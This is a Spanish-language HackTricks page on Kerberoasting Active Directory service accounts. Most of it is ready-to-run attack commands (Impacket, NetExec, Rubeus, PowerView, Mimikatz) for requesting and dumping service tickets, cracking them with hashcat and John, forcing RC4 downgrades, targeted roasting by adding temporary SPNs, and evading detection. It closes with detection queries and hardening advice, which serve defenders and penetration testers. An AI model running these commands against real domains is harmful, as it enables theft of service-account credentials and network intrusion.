# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting se centra en la obtención de tickets TGS, específicamente los relacionados con servicios que se ejecutan bajo cuentas de usuario en Active Directory (AD), excluidas las cuentas de equipo. El cifrado de estos tickets utiliza claves derivadas de las contraseñas de usuario, lo que permite el cracking de credenciales sin conexión. El uso de una cuenta de usuario como servicio se indica mediante una propiedad ServicePrincipalName (SPN) no vacía.

Cualquier usuario autenticado del dominio puede solicitar tickets TGS, por lo que no se necesitan privilegios especiales.<sup>[[4]](#references)[[5]](#references)</sup>

### Puntos clave

- Apunta a tickets TGS de servicios que se ejecutan bajo cuentas de usuario (es decir, cuentas con SPN establecido; no cuentas de equipo).
- Los tickets se cifran con una clave derivada de la contraseña de la cuenta de servicio y se pueden crackear sin conexión.
- No se requieren privilegios elevados; cualquier cuenta autenticada puede solicitar tickets TGS.

> [!WARNING]
> La mayoría de las herramientas públicas prefieren solicitar tickets de servicio RC4-HMAC (etype 23) porque son más rápidos de crackear que AES. Los hashes TGS RC4 comienzan con `$krb5tgs$23$*`, los AES128 con `$krb5tgs$17$*` y los AES256 con `$krb5tgs$18$*`. Sin embargo, muchos entornos están migrando a usar solo AES. No des por sentado que solo RC4 es relevante.
> Además, evita hacer roasting indiscriminado. El kerberoast predeterminado de Rubeus puede consultar y solicitar tickets para todos los SPN, lo que genera mucho ruido. Primero enumera y apunta a los principales que sean interesantes.

### Secretos de cuentas de servicio y coste de la criptografía Kerberos

Muchos servicios todavía se ejecutan bajo cuentas de usuario con contraseñas gestionadas manualmente. El KDC cifra los tickets de servicio con claves derivadas de esas contraseñas y entrega el texto cifrado a cualquier principal autenticado, por lo que Kerberoasting permite realizar intentos ilimitados sin conexión, sin bloqueos ni telemetría del DC. El modo de cifrado determina el presupuesto de cracking:

| Modo | Derivación de clave | Tipo de cifrado | Rendimiento aprox. con RTX 5090* | Notas |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 con 4,096 iteraciones y una sal por principal generada a partir del dominio + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 millones de intentos/s | La sal impide usar tablas rainbow, pero aun así permite crackear rápidamente contraseñas cortas. |
| RC4 + hash NT | Un único MD4 de la contraseña (hash NT sin sal); Kerberos solo añade un confounder de 8 bytes por ticket | etype 23 (`$krb5tgs$23$`) | ~4.18 **mil millones** de intentos/s | ~1000× más rápido que AES; los atacantes fuerzan RC4 siempre que `msDS-SupportedEncryptionTypes` lo permita. |

*Benchmarks de Chick3nman, según se citan en el [análisis de Kerberoasting de Matthew Green](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).<sup>[[3]](#references)</sup>

El confounder de RC4 solo aleatoriza el flujo de claves; no añade trabajo por intento. A menos que las cuentas de servicio utilicen secretos aleatorios (gMSA/dMSA, cuentas de equipo o cadenas gestionadas por un vault), la velocidad para comprometerlas depende únicamente de la capacidad de la GPU. Aplicar únicamente etypes AES elimina la degradación a miles de millones de intentos por segundo, pero las contraseñas humanas débiles siguen siendo vulnerables a PBKDF2.<sup>[[3]](#references)</sup>

### Ataque

#### Linux

En la referencia [1] se encuentra un ejemplo práctico de extremo a extremo que utiliza NetExec para solicitar tickets susceptibles de roasting y Hashcat para crackearlos.<sup>[[1]](#references)</sup>

```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```

Herramientas multifunción que incluyen comprobaciones de kerberoast:

```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```

#### Windows

- Enumerar usuarios vulnerables a Kerberoasting

```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```

- Técnica 1: Solicitar TGS y hacer dump desde memoria

```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```

- Técnica 2: Herramientas automáticas

```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```

> [!WARNING]
> Una solicitud TGS genera el evento de seguridad de Windows 4769 (Se solicitó un ticket de servicio Kerberos).

### OPSEC y entornos solo AES

- Solicita RC4 intencionalmente para cuentas sin AES:
  - Rubeus: `/rc4opsec` usa tgtdeleg para enumerar cuentas sin AES y solicita tickets de servicio RC4.
  - Rubeus: `/tgtdeleg` con kerberoast también genera solicitudes RC4 cuando es posible.<sup>[[6]](#references)</sup>
- Haz roast de cuentas solo AES en lugar de fallar silenciosamente:
  - Rubeus: `/aes` enumera cuentas con AES habilitado y solicita tickets de servicio AES (etype 17/18).
  - Si ya tienes un TGT (PTT o de un .kirbi), puedes usar `/ticket:<blob|path>` con `/spn:<SPN>` o `/spns:<file>` y omitir LDAP.
- Selección de objetivos, limitación de solicitudes y menos ruido:
  - Usa `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` y `/jitter:<1-100>`.
  - Filtra por contraseñas probablemente débiles usando `/pwdsetbefore:<MM-dd-yyyy>` (contraseñas antiguas) o apunta a OUs privilegiadas con `/ou:<DN>`.<sup>[[8]](#references)</sup>

Ejemplos (Rubeus):

```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```

### Cracking

```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```

### Persistencia / abuso

Si controlas una cuenta o puedes modificarla, puedes hacer que sea kerberoastable agregándole un SPN:

```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```

Degrada una cuenta para habilitar RC4 y facilitar el cracking (requiere privilegios de escritura en el objeto de destino):

```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```

#### Targeted Kerberoast mediante GenericWrite/GenericAll sobre un usuario (SPN temporal)

Cuando BloodHound muestra que tienes control sobre un objeto de usuario (p. ej., GenericWrite/GenericAll), puedes hacer «targeted-roast» de forma fiable a ese usuario específico, aunque actualmente no tenga ningún SPN:<sup>[[9]](#references)</sup>

- Añade un SPN temporal al usuario controlado para que sea roastable.
- Solicita un TGS-REP cifrado con RC4 (etype 23) para ese SPN, para facilitar el cracking.
- Crackea el hash `$krb5tgs$23$...` con hashcat.
- Elimina el SPN para reducir la huella.

Windows (PowerView/Rubeus):

```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```

Comando de una sola línea para Linux (targetedKerberoast.py automatiza add SPN -> request TGS (etype 23) -> remove SPN):<sup>[[2]](#references)</sup>

```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```

Crackea la salida con la detección automática de hashcat (modo 13100 para `$krb5tgs$23$`):

```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```

Notas de detección: agregar o quitar SPNs genera cambios en el directorio (Event ID 5136/4738 en el usuario objetivo) y la solicitud TGS genera Event ID 4769. Considera limitar la frecuencia y realizar una limpieza inmediata.

Puedes encontrar herramientas útiles para ataques de kerberoast aquí: https://github.com/nidem/kerberoast

Si encuentras este error en Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`, se debe a una diferencia entre la hora local y la del DC. Sincroniza con el DC:

- `ntpdate <DC_IP>` (obsoleto en algunas distribuciones)
- `rdate -n <DC_IP>`

### Kerberoast sin una cuenta de dominio (AS-requested STs)

En septiembre de 2022, Charlie Clark mostró que, si un principal no requiere preautenticación, es posible obtener un ticket de servicio mediante un KRB_AS_REQ manipulado, alterando el sname en el cuerpo de la solicitud y obteniendo efectivamente un ticket de servicio en lugar de un TGT. Esto refleja el AS-REP roasting y no requiere credenciales de dominio válidas.

Consulta los detalles en el artículo de Semperis «Nuevas rutas de ataque: AS-requested STs».<sup>[[10]](#references)</sup>

> [!WARNING]
> Debes proporcionar una lista de usuarios porque, sin credenciales válidas, no puedes consultar LDAP con esta técnica.

Linux

- Impacket (PR #1413):

```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```

Windows

- Rubeus (PR #139):

```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```

Relacionado

Si estás apuntando a usuarios vulnerables a AS-REP roast, consulta también:

{{#ref}}
asreproast.md
{{#endref}}

### Detección

Kerberoasting puede ser sigiloso. Busca el Event ID 4769 en los DC y aplica filtros para reducir el ruido:

- Excluye el nombre de servicio `krbtgt` y los nombres de servicio que terminen en `$` (cuentas de equipo).
- Excluye las solicitudes de cuentas de máquina (`*$$@*`).
- Solo solicitudes exitosas (Failure Code `0x0`).
- Registra los tipos de cifrado: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). No generes alertas solo por `0x17`.

Ejemplo de triaje con PowerShell:

```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
  Where-Object {
    ($_.Message -notmatch 'krbtgt') -and
    ($_.Message -notmatch '\$$') -and
    ($_.Message -match 'Failure Code:\s+0x0') -and
    ($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
    ($_.Message -notmatch '\$@')
  } |
  Select-Object -ExpandProperty Message
```

Ideas adicionales:

- Establece una línea base del uso normal de SPN por host/usuario; genera alertas ante grandes ráfagas de solicitudes de SPN distintos desde un único principal.
- Señala el uso inusual de RC4 en dominios reforzados con AES.

### Mitigación / Refuerzo

- Usa gMSA/dMSA o cuentas de máquina para los servicios. Las cuentas administradas tienen contraseñas aleatorias de más de 120 caracteres que rotan automáticamente, lo que hace impracticable el cracking offline.<sup>[[7]](#references)</sup>
- Fuerza AES en las cuentas de servicio configurando `msDS-SupportedEncryptionTypes` para que solo admita AES (decimal 24 / hexadecimal 0x18) y, a continuación, cambia la contraseña para que se deriven claves AES.<sup>[[7]](#references)</sup>
- Cuando sea posible, deshabilita RC4 en tu entorno y supervisa los intentos de uso de RC4. En los DC puedes usar el valor de registro `DefaultDomainSupportedEncTypes` para definir los valores predeterminados de las cuentas que no tengan configurado `msDS-SupportedEncryptionTypes`. Prueba exhaustivamente.
- Elimina los SPN innecesarios de las cuentas de usuario.<sup>[[7]](#references)</sup>
- Usa contraseñas largas y aleatorias para las cuentas de servicio (25 caracteres o más) si no es viable usar cuentas administradas; prohíbe las contraseñas comunes y realiza auditorías con regularidad.<sup>[[7]](#references)</sup>

## References

- [1] [HTB: Breach – kerberoast de LDAP con NetExec + cracking con hashcat en la práctica](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [3] [Matthew Green – Kerberoasting: ataques de alto impacto y baja complejidad basados en criptografía Kerberos heredada (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [4] [Kerberos (II): ¿Cómo atacar Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [5] [ired.team – Abuso de Kerberos en Active Directory: T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [6] [ired.team – Kerberoasting: solicitud de TGS cifrados con RC4 cuando AES está habilitado](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [7] [Microsoft Security Blog (2024-10-11) – Recomendaciones de Microsoft para ayudar a mitigar Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [8] [SpecterOps – Documentación del comando kerberoast de Rubeus](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
- [9] [HTB: Delegate — credenciales de SYSVOL → Targeted Kerberoast → Unconstrained Delegation → DCSync para obtener DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [10] [Semperis – ¿Nuevas rutas de ataque? AS Requested Service Tickets (Charlie Clark, septiembre de 2022)](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
{{#include ../../banners/hacktricks-training.md}}
